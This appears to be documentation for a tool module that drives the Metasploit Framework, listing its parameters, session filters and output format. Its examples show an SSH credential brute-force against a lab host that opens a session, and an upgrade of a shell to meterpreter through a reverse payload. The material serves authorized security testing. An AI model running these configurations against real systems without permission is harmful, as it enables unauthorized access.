
## Description
Module orchestrates [Metasploit Framework](https://github.com/rapid7/metasploit-framework).

## Prerequisites
Metasploit must be accessible from Worker it will be executed on.

## Input parameters

### `module_type`
Type of Metasploit module (valid values: `exploit`, `post`, `encoder`, `auxiliary`, `nop`, `payload`).

| Name          | Type   | Required | Default value | Example value |
|---------------|--------|----------|---------------|---------------|
| `module_type` | string | &check;  |               | `exploit`     |

### `module`
Name of Metasploit module.

| Name     | Type   | Required | Default value | Example value                        |
|----------|--------|----------|---------------|--------------------------------------|
| `module` | string | &check;  |               | `unix/irc/unreal_ircd_3281_backdoor` |

### `module_options`
Object with options for the given module.

| Name             | Type   | Required | Default value | Example value         |
|------------------|--------|----------|---------------|-----------------------|
| `module_options` | object | &cross;  |               | `{"RHOST": "target"}` |

### `payload`
Name of payload to use. **Can be combined with `exploit` module only.**

| Name      | Type   | Required | Default value | Example value           |
|-----------|--------|----------|---------------|-------------------------|
| `payload` | string | &cross;  |               | `cmd/unix/reverse_perl` |

### `payload_options`
Object with options for the given payload.

| Name              | Type   | Required | Default value | Example value            |
|-------------------|--------|----------|---------------|--------------------------|
| `payload_options` | object | &cross;  |               | `{"LHOST": "localhost"}` |

### `wait_for_result`
Whether the module should be executed as background job. If False the module is executed without waiting for the job to finish. Be aware, that then the console output of the module's execution may not be fully captured. If this option is set to True, the module waits until the job is completed and the output of the module is fully captured.

| Name              | Type    | Required | Default value | Example value |
|-------------------|---------|----------|---------------|---------------|
| `wait_for_result` | boolean | &cross;  | `true`        | `false`       |

### `module_timeout`
Number of seconds to wait before the module execution will be terminated.

| Name              | Type    | Required | Default value | Example value |
|-------------------|---------|----------|---------------|---------------|
| `module_timeout` | integer | &cross;  | `120`         | `300`         |

### `module_retries`
Defines how many times should metasploit module try to be executed, if it didn't finish successfully until the `module_timeout`is reached.

| Name              | Type    | Required | Default value | Example value |
|-------------------|---------|----------|---------------|---------------|
| `module_retries` | integer | &cross;  | `3`           | `1`           |

### `ignore_old_sessions`
Ignore sessions created before the module execution.

| Name                  | Type    | Required | Default value | Example value |
|-----------------------|---------|----------|---------------|---------------|
| `ignore_old_sessions` | boolean | &cross;  | `true`        | `false`       |

### `session_filter`
Group of parameters used to match the desired session. Check [here](#filtering-sessions) for more information.

| Name             | Type   | Required | Default value | Example value             |
|------------------|--------|----------|---------------|---------------------------|
| `session_filter` | object | &cross;  |               | `{"type": "meterpreter"}` |

Use the following parameters to filter sessions:

| Name         | Type    | Required | Default value | Example value                             |
|--------------|---------|----------|---------------|-------------------------------------------|
| type         | string  | &cross;  |               | meterpreter                               |
| tunnel_local | string  | &cross;  |               | 127.0.1.1:4433                            |
| tunnel_peer  | string  | &cross;  |               | 127.0.0.1:41990                           |
| via_exploit  | string  | &cross;  |               | exploit/multi/handler                     |
| via_payload  | string  | &cross;  |               | payload/linux/x86/meterpreter/reverse_tcp |
| desc         | string  | &cross;  |               | Meterpreter                               |
| info         | string  | &cross;  |               | user @ 1.2.3.4                            |
| workspace    | string  | &cross;  |               | default                                   |
| session_host | string  | &cross;  |               | 127.0.0.1                                 |
| session_port | integer | &cross;  |               | 41990                                     |
| target_host  | string  | &cross;  |               | 127.0.0.1                                 |
| username     | string  | &cross;  |               | unknown                                   |
| uuid         | string  | &cross;  |               | ryb0fvnj                                  |
| exploit_uuid | string  | &cross;  |               | di40gcmz                                  |
| routes       | string  | &cross;  |               |                                           |
| arch         | string  | &cross;  |               | x86                                       |
| platform     | string  | &cross;  |               | linux                                     |

## Examples

### SSH login module
Input:
```yaml
module_arguments:
  module_type: auxiliary
  module: scanner/ssh/ssh_login
  module_options:
    RHOSTS: CHANGE ME
    USERNAME: vagrant
    PASSWORD: vagrant
```

Output:
```json
{
  "result": "ok", 
  "output": "VERBOSE => True\nBRUTEFORCE_SPEED => 5\nBLANK_PASSWORDS => false\nUSER_AS_PASS => false\nDB_ALL_CREDS => false\nDB_ALL_USERS => false\nDB_ALL_PASS => false\nDB_SKIP_EXISTING => none\nSTOP_ON_SUCCESS => false\nREMOVE_USER_FILE => false\nREMOVE_PASS_FILE => false\nREMOVE_USERPASS_FILE => false\nTRANSITION_DELAY => 0\nMaxGuessesPerService => 0\nMaxMinutesPerService => 0\nMaxGuessesPerUser => 0\nCreateSession => true\nAutoVerifySession => true\nTHREADS => 1\nShowProgress => true\nShowProgressPercent => 10\nRPORT => 22\nSSH_IDENT => SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3\nSSH_TIMEOUT => 30\nSSH_DEBUG => false\nGatherProof => true\nRHOSTS => 192.168.56.51\nUSERNAME => vagrant\nPASSWORD => vagrant\nDisablePayloadHandler => True\n[*] 192.168.56.51:22 - Starting bruteforce\n[+] 192.168.56.51:22 - Success: 'vagrant:vagrant' 'uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant) Linux vagrant-ubuntu-trusty-64 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '\n[!] No active DB -- Credential data will not be saved!\n[*] SSH session 1 opened (192.168.56.50:36169 -> 192.168.56.51:22) at 2022-08-04 17:03:56 +0200\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n",
  "serialized_output": {"session_id": 1} 
}
```

### Upgrade shell session
```yaml
module_arguments:
  session_filter:
    target_host: {{ attackerHost }}
    via_exploit: exploit/multi/handler
    type: meterpreter
  module_type: post
  module: multi/manage/shell_to_meterpreter
  module_options:
    LHOST: {{ attackerHost }}
    SESSION: 1
```

## Troubleshooting
Currently, the module only allows Metasploit module execution - `db_nmap` and other commands are unsupported.

### Filtering sessions
If a module/exploit returns a session, we have to filter the rest of the sessions.

By default, if `RHOSTS` or `RHOST` (non-case sensitive) is defined in the `module_options` parameter, the following data is used to match the session.
```json
{"target_host": "<RHOSTS/RHOST>", "via_exploit": "<module>", "via_payload": "<payload>"}
```

## Output serialization
Only the session ID is serialized.

`serialized_output` contains:

| Parameter name | Parameter description                        |
|----------------|----------------------------------------------|
| `session_id`   | ID of the created session (only if created). |
